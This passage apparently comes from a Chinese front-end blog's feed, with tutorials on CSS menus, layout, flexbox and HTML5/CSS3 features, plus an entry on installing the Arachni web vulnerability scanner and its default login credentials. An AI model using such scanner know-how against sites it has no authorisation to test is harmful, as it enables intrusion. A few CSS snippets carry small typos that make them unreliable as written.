&lt;title&gt;Document&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; *&#123; margin: 0; padding:0; &#125; .list ul&#123; overflow: hidden; list-style: none; margin: 0 20px; border:1px solid grey; padding: 5px 10px; &#125; .list li &#123; float: left; border-right: 1px solid grey; padding: 0 10px; &#125; .list li a&#123; display: block; text-decoration: none; border-radius: 3px; &#125; .list li:last-child&#123; border-right: none; &#125; .list a:hover&#123; background-color: grey; border-radius: 4px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;nav class=&quot;list&quot;&gt; &lt;ul&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;Home&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;Pages&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;Content&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;About&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/nav&gt;&lt;/body&gt;&lt;/html&gt; 注释: 浮动可以让 li 元素从垂直变成水平。当然可以使用 display:inline-block 属性将 li 变成水平方向的。 ul { overflow:hidden;} 可以使 ul 强制包裹 浮动的 li。 0x02 下拉菜单html示例代码: 123456789101112131415161718192021222324252627282930313233&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;multipule.css&quot;&gt;&lt;/head&gt;&lt;body&gt; &lt;nav id=&quot;nav&quot;&gt; &lt;ul class=&quot;firstNav&quot;&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;人类&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;植物&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;动物&lt;/a&gt; &lt;ul class=&quot;secondNav&quot;&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;犬科&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;猫科&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;鸟科&lt;/a&gt; &lt;ul class=&quot;thirdNav&quot;&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;大鸟&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;中鸟&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;小鸟&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;小小鸟&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;昆虫科&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;微生物&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/nav&gt;&lt;/body&gt;&lt;/html&gt; CSS示例代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102*&#123; margin: 0; padding: 0; text-decoration: none; list-style: none;&#125;#nav&#123; font:1em &quot;宋体&quot;;&#125;/*显示样式规则*//*一级菜单显示*/ /*设置所有 a 标签的显示样式*/#nav li a &#123; color:#555; background-color: gray; padding: .2em 1em; border-width: 3px; border-color:transparent; border-right-style: solid; background-clip: padding-box;&#125;#nav li:hover &gt; a&#123; color: #fff; background-color: #aaa;&#125; /* a 标签显示样式结束 *//*一级菜单显示结束*//*二级菜单显示样式*/#nav ul&#123; height: 2em; &#125;#nav li ul&#123; width:9em; height: 7em;&#125;#nav li li a&#123; /*去掉继承的右边框*/ border-right: none; border-top:2px solid transparent;&#125;/*结束二级菜单显示演示*//*显示样式规则结束*//*开始设置功能样式*/#nav &#123; position: relative;&#125;#nav li&#123; float: left; position: relative;&#125;#nav li a&#123; display: block;&#125;/*二级菜单功能样式*/#nav li ul &#123; /*隐藏二级菜单*/ display: none; /*相对父元素绝对定位*/ position: absolute; left: 20px; top: 100%;&#125;#nav li:hover &gt; ul&#123; /*一级菜单悬浮时显示二级菜单*/ display: block; &#125;/*二级菜单功能演示结束*/#nav li li&#123; /*二级菜单停止悬浮，恢复重叠*/ float: none; border:none;&#125;/*三级菜单功能样式*/#nav li li ul&#123; position: absolute; left: 100%; top:0;&#125;/*结束三级菜单功能样式*//*结束功能样式*/ 核心代码12div.menu-bar ul ul &#123; display: none;&#125;div.menu-bar li:hover &gt; ul &#123; display: block;&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Arachni]]></title>
      <url>%2F2016%2F09%2F16%2FArachni%2F</url>
      <content type="text"><![CDATA[0x00 ArachniArachni 是一款算不上强大但非常有特性的扫描器，默认kali 2.0 自带阉割版。所以我们需要重新安装。 Arachni官方网站:http://www.arachni-scanner.com/download/#linux Arachni 时开源跨平台的，同时也支持 Windows 和 Mac 版本。 安装包下载完成以后，将其复制到当前目录并解压 12root ~ cp Downloads/arachni-1.4-0.5.10-linux-x86_64.tar.gz .root ~ tar xvf arachni-1.4-0.5.10-linux-x86_64.tar.gz cat Arachni 的 README 文件可以发现默认 Arachni 有两个账号 123456789Default account details: Administrator: E-mail address: admin@admin.admin Password: administrator User: E-mail address: user@user.user Password: regular_user Arachni 有两种不同的启动方式，console 和 Web 方式，分别对应 Arachni bin 目录下的 arachni_console 和 arachni_web 启动脚本: 123 root ~ arachni-1.4-0.5.10 bin lsarachni_console arachni_rpcd_monitor arachni_restore arachni_web ./arachni_web12345 root ~ arachni-1.4-0.5.10 bin ./arachni_webPuma 2.14.0 starting...* Min threads: 0, max threads: 16* Environment: development* Listening on tcp://localhost:9292 此后访问 Arachni 的 Web [http://localhost:9292]页面，使用刚才的管理员账号和密码进行登录。 0x01 Arachni 操作初识 进入到 Arachni 的 web 操作界面，我们可以发现 Arachni 的操作是一目了然的。我们先来看看它的扫描功能，如果只是做个简单的 web 扫描的话，那么 Arachni 默认已经给我们准备好了上扫描加脚本。但是 Arachni 的真正强大之处在于它的 Advanced options 。 Advanced optionsArachni 支持的是 分布式的扫描 (Dispatcher)。 Scheduling此外 Arachni 还可以提供调度扫描 有意思的是 ，匿名者组织也对 Arachni 钟爱有加]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[CSS布局]]></title>
      <url>%2F2016%2F09%2F14%2FCSS%E5%B8%83%E5%B1%80%2F</url>
      <content type="text"><![CDATA[0x00 display 属性display属性可以对元素的属性进行转换，使块级元素具有行级元素的特征，使行级元素具有块元素的特征。 属性值 描述 none 隐藏元素 inline 转换行级元素 block 转换块级元素 inline-block 行内块级元素 关于 inline 常见的例子是：把 li 元素修改成 inline，制作成水平菜单。 去掉 img 标签产生的下边距的方法是将 img 设置: display:block.或者设置: inline-block简单的讲设置了 inline-block 属性的元素既拥有了 block 元素可以设置 width 和 height 的特性，又保持了inline元素不换行的特性。 inline-block 空白符其实有 inline-block 空白符并不是怪 inline-block ，而是 inline ，因为默认情况下 inline 就是存在空白符的。 我们编写代码时写的空格，换行都会产生空白符。在浏览器中，空白符是不会被浏览器忽略的，多个连续的空白符浏览器会自动将其合并成一个。 1234&lt;a href=&quot;&quot;&gt;1&lt;/a&gt;&lt;a href=&quot;&quot;&gt;2&lt;/a&gt;&lt;a href=&quot;&quot;&gt;3&lt;/a&gt;&lt;a href=&quot;&quot;&gt;4&lt;/a&gt;&lt;a href=&quot;&quot;&gt;5&lt;/a&gt;&lt;a href=&quot;&quot;&gt;6&lt;/a&gt; 如上:1,2,3,4之间在浏览器中显示时将存在空隙，4,5,6,之间将不存在空隙。 要去除空白符产生的间隙，可以通过设置 font-size 属性控制各个元素间产生的间隙的大小。 12345678.advertisement &#123; font-size: 0px; &#125; .advertisement a&#123; font-size: 14px; margin:0; padding: 0; &#125; inline-block 应用网页头部菜单一个应用场景是，除了使用 float 对 li 进行横向导航布局外，还可以使用 inline-block 进行 li 导航设计。当然他们各有优劣，float属性会造成高度塌陷，需要清除浮动等问题。而 inline-block 则会带来 空白符 的问题。 内联块元素除了菜单之外，一切需要行内排列并且可设置大小的需求就可以用inline-block来实现。例如使用a标签做按钮时，需要设置按钮的大小，我们就可以使用inline-block来实现。 inline-block 布局一个简单的三栏布局: 123456789101112131415.news, .showProduct , .contact&#123; display: inline-block; width: 30%; height: 95%; margin: 1em; &#125; &lt;div class=&quot;contentContainer&quot;&gt; &lt;div class=&quot;content&quot;&gt; &lt;div class=&quot;news&quot;&gt;news&lt;/div&gt; &lt;div class=&quot;showProduct&quot;&gt;showProduct&lt;/div&gt; &lt;div class=&quot;contact&quot;&gt;contact&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; vertical-align 属性会影响到 inline-block 元素，你可能会把它的值设置为 top 。 0x01 margin-auto 与 max-width位块级元素设置 width 可以阻止其从左到右撑满容器，然后使用 margin-auto 属性来使其水平居中。 1234#main&#123; width:200px margin-auto;&#125; 唯一的问题是，当浏览器窗口比元素的宽度还要窄时，浏览器会显示一个水平滚动条来容纳页面。在这种情况下使用 max-width 替代 width可以使浏览器更好地处理小窗口的情况。这点在移动设备上显得尤为重要， 1234#main&#123; maxwidth:200px margin-auto;&#125; 0x02 box-sizing [CSS3]为了解决布局中的烦人的数学问题，box-sizing 应运而生。 box-sizing 有两个属性值:content-box , border-box content-boxcontent-box :表示元素的宽度与高度不包括填充padding与边框border的宽度与高度。对其宽度和高度的设定是对其内容的高度和宽的设定。当padding与border改变时将使其向外扩张。此时内容的高度和宽度不变。 border-boxborder-box :表示元素的宽度与高度包括填充padding与边框border的宽度与高度。对其宽度和高度的设定是对其本身实际高度和宽的设定。当padding与border改变时将使其向内容空间塌陷。此时内容的高度和宽度将随之改变。 想要页面上所有的元素都有如此表现，那么可以： 12345* &#123; -webkit-box-sizing:border-box; -moz-box-sizing:border-box; box-sizing:border-box;&#125; 0x3 position 属性position 属性一共有四个值: static , relative , absolute , fixed static默认值，元素将按照正常文档流规则排列 relative相对定位，元素元素仍然处于正常文档流当中，元素原来的位置将会保留，此后以此元素原来的静态位置作为参考点。 absolute绝对定位,元素脱离正常文档流，不在占据原来的位置，参考已定位 的父元素位置进行偏移。（如果父元素没有设置定位属性值(这个值要是非 static)会一层层向上找寻定位参考元素，可以一直追溯到 body 然后根据它的位置偏移） fixed固定定位，元素脱离正常文档流，不再占用原来的位置，此后以浏览器的可视区域的四角作为参考点。 如果它一个元素是 position: static，那么它的绝对定位子元素会跳过它直接相对于 body 元素定位。 !Note 何为文档流?将窗体自上而下分成一行行，并在每一行中按从左到右的顺序排放元素，即为文档流。 有三种情况将使得元素脱离文档流，分别是浮动(float left or right)、绝对定位(position:absolute)、固定定位(position:fixed)。 参考来源:http://www.cnblogs.com/fsjohnhuang/p/3967350.html CSS 三种定位机制: 文档流，浮动(float),定位(position)使用浮动和定位能够使元素脱离文档流 0x04 float 浮动属性float 属性可以控制元素浮动的方式为： left, right , none ,inherit 。 在 CSS 中，任何元素都可以浮动。浮动元素会生成一个 块级框，而不论它本身是何种元素。 向右浮动，浮动元素将会逆序显示，向左，则相反。 假如在一行之上只有极少的空间可供浮动元素，那么这个元素会跳至下一行，这个过程会持续到某一行拥有足够的空间为止。 使用浮动(float)的一个比较疑惑的事情是他们怎么影响包含他们的父元素的。如果父元素只包含浮动元素，那么它的高度就会塌缩为零。 值得注意的是，在同一个父元素中，浮动元素对非浮动元素的影响是，浮动元素将会覆盖非浮动元素的空间，进而挤压非浮动元素的内容。 图片溢出处理使用 float 一个最简单的场景就是文字对图片的环绕,但是这里也存在一个问题，就是当图片的大小超过了包含该图片的容器，而且图片本身是浮动的，那么此时，图片将会溢出到容器外面。 解决思路是: 对容器使用 overflow:auto 属性，那么容器将会自动调整大小区包裹图片 12.img &#123; float:right;&#125;.containerImg&#123;overflow:auto;&#125; 对图片本身进行控制。 1234.container img&#123; float:right; width:50%;&#125; 甚至还能同时使用 min-width 和 max-width 来限制图片的最大或最小宽度。 清除浮动清除浮动:clear:both,给父级添加高度,添加一个空的div,使用 display:inline-block,终极大招 给父级添加 overflow:hidden clear属性为了让 float 元素不影响其他的元素，可以使用 clear 属性清除浮动属性，但是 clear 属性不是作用于 浮动 元素而是作用于下一元素的。 将浮动元包裹在一起另外一种是的浮动元素不影响其它元素的方法，就是不清楚浮动而是将所有浮动的元素放在一个父元素中。 使用空 div我们还可以在浮动元素与非浮动元素之间放置一个空的 div,并为其设置 clear 属性。 1234567891011&lt;style type=&quot;text/css&quot;&gt;.clear&#123;clear:both&#125;&lt;/style&gt;&lt;div&gt; &lt;div class=&quot;float1&quot;&gt;&lt;/div&gt; &lt;div class=&quot;float2&quot;&gt;&lt;/div&gt; &lt;div class=&quot;clear&quot;&gt;&lt;/div&gt; &lt;p&gt;&lt;/p&gt;&lt;/div&gt; 0x05 visibility 属性 属性值 描述 visible 显示元素 hidden 隐藏元素 collapse 当在表格元素中使用时，可以隐藏一行或者一列，但被行列占据的空间会留给其他内容使用，该值应用于其它元素，会被呈现为 hidden visibility:hidden 和 display:none使用CSS display:none 属性后，HTML元素（对象）的宽度、高度等各种属性值都将“丢失”,原有空间回收;而使用 visibility:hidden 属性后，HTML元素（对象）仅仅是在视觉上看不见（完全透明），而它所占据的空间位置仍然存在。 0x06 overflow 属性 属性值 描述 visible 溢出内容出现在元素框之外；(默认) hidden 隐藏溢出内容 auto 自适应索要显示的内容，需要时产生滚动条 scroll 溢出内容被修剪且始终显示滚动条 此外， 使用 overflow-x 可以横向显示样式， overflow-y 将纵向显示样式。 0x07 flexbox新的 flexbox 布局模式被用来重新定义CSS中的布局方式。 0x08 所有浏览器下的CSS透明度下面这种方式可以实现所有浏览器下的透明度设置： 12345.transparent &#123; zoom:1; filter:alpha(opacity=50); opacity:0.5;&#125; Zoom 属性是IE浏览器的专有属性，Firefox等浏览器不支持。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[CSS FlexBox]]></title>
      <url>%2F2016%2F09%2F14%2FCSS3FlexBox%E5%BA%94%E7%94%A8%2F</url>
      <content type="text"><![CDATA[0x00 一个简单的基础 Flex 展示：123456789101112131415161718&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;mystyle.css&quot;&gt;&lt;/head&gt;&lt;body&gt; &lt;p&gt;Flexbox nuovo&lt;/p&gt; &lt;div class=&quot;flex&quot;&gt; &lt;div&gt;uno&lt;/div&gt; &lt;div&gt;due&lt;/div&gt; &lt;div&gt;tre&lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 1234567891011121314151617181920212223242526272829303132333435.flex &#123; /*基本样式*/ width: 350px; height: 200px; border: 1px solid #555; font: 14px Arial; /*建立弹性框*/ display: -webkit-flex; -webkit-flex-direction:row; display: flex; flex-direction: row;&#125;.flex &gt; div &#123; -webkit-flex: 1 1 auto; flex: 1 1 auto; width: 30px; border: 1px solid red; -webkit-transition: width 0.7s ease-out; transition: width 0.7s ease-out;&#125;.flex &gt; div:nth-child(1) &#123;background: #009246;&#125;.flex &gt; div:nth-child(2) &#123; background:#f1f2f1; &#125;.flex &gt; div:nth-child(3) &#123; background: #ce2b37; &#125;.flex &gt; div:hover &#123; width: 200px;&#125; 0x01 圣杯模型使弹性盒子根据不同屏幕分辨率动态改变布局。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;mystyle.css&quot;&gt; &lt;style type=&quot;text/css&quot;&gt; body &#123; font: 24px Helvetica; background:#999999; border:1px green solid;&#125;#main &#123; min-height: 800px; margin: 0px; padding: 0px; display: -webkit-flex; display: flex; -webkit-flex-flow: row; flex-flow: row;&#125;#main &gt; article &#123; margin: 4px; padding: 5px; border: 1px solid #ccc333; border-radius: 7pt; background: #dddd88; -webkit-flex: 3 1 60%; flex: 3 1 60%; -webkit-order: 2; order: 2;&#125;#main &gt; nav &#123; margin: 4px; padding: 5px; border: 1px solid #8888dd; border-radius: 7pt; background: #ccccff; -webkit-flex: 1 6 2 20%; flex: 1 6 20%; -webkit-order:1; order:1;&#125;#main aside &#123; margin: 4px; padding: 5px; border: 1px solid #8888bb; border-radius: 7pt; background: #ccccff; -webkit-flex: 1 6 20%; flex: 1 6 20%; -webkit-order:3; order:3;&#125;header, footer &#123; display: block; margin: 4px; pading 5px; min-height: 100px; border: 1px solid #eebb55; border-radius: 7pt; background:#ffeebb;&#125;/*窄到不足以支撑三栏的时候*/@media all and (max-width: 640px) &#123; #main, #page&#123; -webkit-flex-flow:column; flex-direction: column; &#125; #main &gt; article, #main &gt; nav, #main &gt; aside &#123; /*恢复到文档内的自然顺序*/ -webkit-order: 0; order:0; &#125; #main &gt; nav, #main &gt; aside,header,footer &#123; min-height: 50px; max-height: 50px; &#125;&#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;header&gt;header&lt;/header&gt; &lt;div id=&quot;main&quot;&gt; &lt;article&gt;article&lt;/article&gt; &lt;nav&gt;nav&lt;/nav&gt; &lt;aside&gt;aside&lt;/aside&gt; &lt;/div&gt; &lt;footer&gt;footer&lt;/footer&gt;&lt;/body&gt;&lt;/html&gt;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[HTML5新增元素]]></title>
      <url>%2F2016%2F09%2F13%2FHTML5%E4%B8%AD%E7%9A%84%E6%96%B0%E5%A2%9E%E5%85%83%E7%B4%A0%2F</url>
      <content type="text"><![CDATA[0X01 HTML5新增主体元素header,nav,aside,section,article,footer 0x02 HTML5新增非主体元素datalistdatalist 要结合 input 元素使用，并且通过的 input 的 list 属于与其关联。 1234567&lt;input type=&quot;text&quot; id=&quot;list&quot; list=&quot;showData&quot;&gt;&lt;datalist id=&quot;showData&quot;&gt; &lt;option value=&quot;boy&quot;&gt;&lt;/option&gt; &lt;option value=&quot;girl&quot;&gt;&lt;/option&gt; &lt;option value=&quot;woman&quot;&gt;&lt;/option&gt; &lt;option value=&quot;man&quot;&gt;&lt;/option&gt;&lt;/datalist&gt; progress表示一个任务的完成进度，而且通常这些任务都在表单中启动和处理。 1&lt;progress value=&quot;10&quot; max=&quot;50&quot;&gt; vaule:表示处理进度的程度max:表示任务完成以后达到的值 meter与 &lt;progress&gt; 类似，用于显示刻度或精度而非进度。 1&lt;meter max=&quot;100&quot; min=&quot;25&quot; low=&quot;40&quot; hight=&quot;100&quot; optimum=&quot;50&quot; value=&quot;15&quot;&gt;&lt;/meter&gt; output用于显示表单元素处理的结果值。for 将 output 元素与参与计算的元素相关联起来。 0x03 HTML5新增文本框元素email1&lt;input type=&quot;email&quot; /&gt; 当在 form 表单中，当输入邮箱地址提交请求时，将会自动验证输入邮箱格式是否正确 tel1&lt;input type=&quot;tel&quot; /&gt; tel 在主要功能作用是针对不同的设备自动跳出响应的数字键盘，这个主要是针对移动端的。它不会去验证输入的电话号码的格式。 number1&lt;input type=&quot;number&quot; step=&quot;10&quot; min=&quot;100&quot; max=&quot;1000&quot;/&gt; number 只能接受数字类型的值。其中: min:表示能输入的最小值max:表示能输入的最大值step:表示每次调整的增量 range1&lt;input type=&quot;range&quot; min=&quot;1000&quot; max=&quot;15000&quot; step=&quot;1000&quot; value=&quot;5000&quot; /&gt; range 允许用户选择一范围的数值。 datetimecolor 0x03 HTML5新增音视频元素 vediovedio 元素提供了 播放、暂停和音量控件来控制视频，也提供了 width 和 height 属性控制视频的尺寸.如果设置的高度和宽度等 vedio 元素有如下属性值： width/height: 设置 vedio 元素的宽度和高度 src/source: 设置视频流的存储路劲 autoplay:视频自动播放 controls:显示 video 元素自带的控制组件 controls poster:指定一个图片路径，在视频等待播放时显示一幅图片。 preload:有三个值:none,metadata,auto。值为none 不缓存视频；metadata 播放前只加载视频的宽高等信息;auto 默认值，要求浏览器尽快下载视频。 loop:反复播放视频 1&lt;video src=&quot;臭屁虫2.mp4&quot; width=&quot;400&quot; height=&quot;400&quot; controls=&quot;controls&quot; autoplay=&quot;autoplay&quot; loop=&quot;loop&quot; &gt;&lt;/video&gt; 视频事件视频处理事件: play():播放媒体文件 load():加载媒体文件，动态应用程序可以使用该方法提前加载 canPlayType(type):查看浏览器是否支持某种类型的媒体格式 progress(): 用于更新资源的下载进度，会周期性的触发。 canplaythrough():当整个媒体可以顺序播放时，触发该事件。 canplay():不考虑整体状态，只有下载了一定可放的帧变化触发该事件 针对视频处理的常用属性如下： ended:媒体播发完成时该属性返回 true paused:暂停播放时，该属性返回 true duration:返回播放时长，以秒为单位 currentTime:获得或设置媒体播放位置 error:播发错误时触发 一个简单的视频处理控件1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge,chrome=1&quot;&gt; &lt;title&gt;video&lt;/title&gt; &lt;meta name=&quot;description&quot; content=&quot;&quot;&gt; &lt;meta name=&quot;keywords&quot; content=&quot;&quot;&gt; &lt;link href=&quot;&quot; rel=&quot;stylesheet&quot;&gt; &lt;style type=&quot;text/css&quot;&gt; #videoBox&#123; width:600px; height: 500px; position: relative; &#125; #contronlBtn&#123; border:1px solid red; width: 40px; height: 40px; &#125; #progressVedio&#123; width: 400px; &#125; #showTime&#123; width: 40px; height: 20px; border:1px solid red; display: block; position: absolute; top:400px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=&quot;videoBox&quot;&gt; &lt;video id=&quot;videoSource&quot; src=&quot;臭屁虫4.mp4&quot; width=&quot;400&quot; height=&quot;400&quot; controls=&quot;controls&quot; autoplay=&quot;autoplay&quot; loop=&quot;loop&quot; &gt;&lt;/video&gt; &lt;span id=&quot;showTime&quot;&gt;&lt;/span&gt; &lt;button id=&quot;contronlBtn&quot;&gt;播放&lt;/button&gt; &lt;progress id=&quot;progressVedio&quot; value=&quot;0&quot; max=&quot;&quot;&gt;&lt;/progress&gt; &lt;span id=&quot;progressTime&quot;&gt;&lt;/span&gt; &lt;span id=&quot;totalTime&quot;&gt;&lt;/span&gt; &lt;/div&gt; &lt;/body&gt; &lt;script type=&quot;text/javascript&quot;&gt; var contronlBtn = document.querySelector(&quot;#contronlBtn&quot;) var videoSource = document.querySelector(&quot;#videoSource&quot;) var progressVedio = document.querySelector(&quot;#progressVedio&quot;) var totalTime = document.querySelector(&quot;#totalTime&quot;) var progressTime = document.querySelector(&quot;#progressTime&quot;) var showTime = document.querySelector(&quot;#showTime&quot;) var timer = null; window.onload = function()&#123; var countTime = parseInt(videoSource.duration) progressVedio.max = countTime totalTime.innerHTML = &quot;时间:&quot;+ parseInt(countTime/60)+&quot;:&quot;+(countTime%60); contronlBtn.onclick = function ()&#123; if(videoSource.paused)&#123; videoSource.play() contronlBtn.innerHTML = &quot;Pause&quot; &#125;else if(videoSource.play)&#123; videoSource.pause() contronlBtn.innerHTML = &quot;Play&quot; &#125; &#125; timer = setInterval(function()&#123; var nowTime = parseInt(videoSource.currentTime) progressVedio.value = nowTime progressTime.innerHTML = parseInt(nowTime/60) + &quot;:&quot; + (nowTime%60); &#125;,1000) progressVedio.onmouseover = function(event)&#123; var mourseTime = parseInt(countTime/progressVedio.offsetWidth*(event.clientX - progressVedio.offsetLeft)) showTime.innerHTML = &quot;&quot;+ parseInt(mourseTime/60)+&quot;:&quot;+(mourseTime%60); showTime.style.left = event.clientX + &quot;px&quot; &#125; progressVedio.onclick = function(event)&#123; videoSource.currentTime = countTime/progressVedio.offsetWidth*(event.clientX - progressVedio.offsetLeft) &#125;&#125;&lt;/script&gt;&lt;/html&gt;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[CSS3新增属性]]></title>
      <url>%2F2016%2F09%2F08%2FCSS3%E6%96%B0%E5%A2%9E%E5%B1%9E%E6%80%A7%2F</url>
      <content type="text"><![CDATA[0x00 boxshadow [ CSS3 ]box-shadow 有以下属性值： 123456h-shadow : 必需。水平阴影位置。值为正投影在对象右边，值为负，投影在对象左边。v-shadow : 必需。垂直阴影位置。值为正投影在对象低部。值为负，投影在对象顶部。color : 阴影颜色。blur : 可选。模糊距离radial: 可选。扩展半径。inset : 可选。将外部阴影（outset）改为内部阴影。 设置四边不同的阴影:1234box-shadow:-10px 0px 5px yellow, 10px 0px 5px red, 0px -10px 5px green, 0px 10px 5px blue; 多重阴影:1box-shadow:10px 0px 5px yellow,20px 0px 20px green; text-shadow [ CSS3]text-shadwo 与 boxs-hadow 基本相同，只是 text-shadwo 不可以定义内阴影。 0x01 box-reflect这是一个实验中的属性，并且实现情况并不理想，目前只有 Chrome 和 safari 支持。 语法样式: 1-webkit-box-reflect: below 10px -webkit-linear-gradient(rgba(0,0,0,0.2) 33%,rgba(0,0,0,0.6) 63%,rgba(0,0,0,0.8) 99%); 支持的参数值：Direction，Offset，Mask Value。分别代表倒影的方向: above,below,left,right距离原图的距离: 像素倒影的渐变样式: 0x02 Animationanimation 的子属性有: animation-name:使用 @keyframes 描述的关键帧名称 animation-duration:动画执行的时间 animation-timing-function:动画速度变化函数 其值有:linear,ease,ease-in,ease-out,ease-in-outanimation-delay:动画延时执行的时间 animation-iteration-count:设置动画重复的次数，infinite 无限次重复动画 animation-direction:动画运行完成以后是反向运行还是重新回到开始位置重复运行。取值有 normal 和 alternate.当设置为 alternate时，表示轮流播放，并且动画会在奇数次数正常播放，在偶数次数反向播放。 animation-fill-mode:指定动画执行前后的元素样式。其常用值有 forwards(当动画执行完成以后，保持最后一个属性值,在最后一个关键帧中定义) 和 backwards(在动画显示前，应用开始属性值，在第一个关键帧中定义) animation-play-state:控制动画的播发状态，可取值:paused(暂停),running(动画播放). 123456789101112131415161718192021222324252627282930313233343536373839&lt;style type=&quot;text/css&quot;&gt; body&#123; position: relative; &#125; #box&#123; width: 100px; height: 40px; background: linear-gradient(red,deeppink,green); position: absolute; left: 0; top:100px; animation: turnBack 6s linear 1s infinite; &#125; @-webkit-keyframes turnBack &#123; from&#123; left: 0px; transform: rotateY(0deg) &#125; 50% &#123; left: 600px; transform: rotateY(0deg) &#125; 51%&#123; transform: rotateY(180deg); &#125;to&#123; left: 0px; transform: rotateY(180deg); &#125; &#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=&quot;box&quot;&gt; I&apos;am box,sir! &lt;/div&gt;&lt;/body&gt; 0x03 TrasitionTransition 属性用于过渡效果的 CSS 属性。 常见用法:1trasition: peroperty duration timing-function delay]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[CSS基础归纳(一)]]></title>
      <url>%2F2016%2F09%2F08%2FCSS%E5%9F%BA%E7%A1%80%E5%BD%92%E7%BA%B3%2F</url>
      <content type="text"><![CDATA[0x00 WEB 3层标准前端页面三层:结构: HTML(内容)表现: CSS(Cascading Style Sheet)行为: JS CSS由三部分组成，对象，属性，和值。对象便是选择器。 0x02 HTML中使用CSS 行内样式(内联样式)位于html标记内，使用 style 属性定义: 1&lt;p style=&quot;color:red;width=400px&quot;&gt;&lt;/p&gt; 内部样式位于 &lt;head&gt;&lt;/head&gt; 之间，使用 &lt;style&gt;&lt;/style&gt; 标记声明：123456&lt;head&gt; &lt;title&gt;&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; p &#123; &#125;; &lt;/style&gt;&lt;/head&gt; 链接样式从外部定义css样式表，通过 &lt;link/&gt; 链接到页面:1&lt;link href=&quot;style.css&quot; rel=&quot;stylesheet&quot; type=&quot;type/css&quot; /&gt; 导入样式在 &lt;style&gt;&lt;/style&gt; 标记之间导入一个外部样式表,导入时使用 @import : 123456789&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;/&gt; &lt;title&gt;&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; @import url(&quot;style.css&quot;); @import url(style.css); @import &quot;style.css&quot;; &lt;/style&gt;&lt;/head&gt; 以上三种方式均有效. link 和 @import 的区别: 1)link属于XHTML标签，而@import是CSS提供的;2)页面被加载的时，link会同时被加载，而@import引用的CSS会等到页面被加载完再加载;3）@import只在IE5以上才能识别，而link是XHTML标签，无兼容问题;4）link方式的样式的权重 高于@import的权重. 0x03 文字属性 属性 描述 属性值 font-weight 字体加粗 bold , normal (正常); font-style 字体风格 normal (正常)，italic (斜体) font-variant font-size 字号 数值 px ;数值 em ; line-height 行高（行距） px, em font-family 字体 可带多个属性值，用逗号隔开，依次执行。中文字体需使用双引号。 font的简写属性:1font: bold italic small-caps 1em/1.5em &quot;宋体&quot; sans-serif; 值得注意的是：css 速记版本只会在你同时指定 font-size 和 font-family 属性时才会生效。如果你没有指定 font-weight, font-style ,或者 font-variant，那么这些值将会自动默认为 normal 0x04 text 文本属性 属性 描述 属性值 color 文本颜色 direction 文本方向 line-height 行高 数值 px ; text-align 文本对齐方式 left , center , right , text-decoration 文本修饰 underline , overline , line-through, none , blink text-indent 文本首行缩进 数值 px ; 数值 em; 百分比 text-tranform 元素中的字母(规范文本大小写) none , uppercase 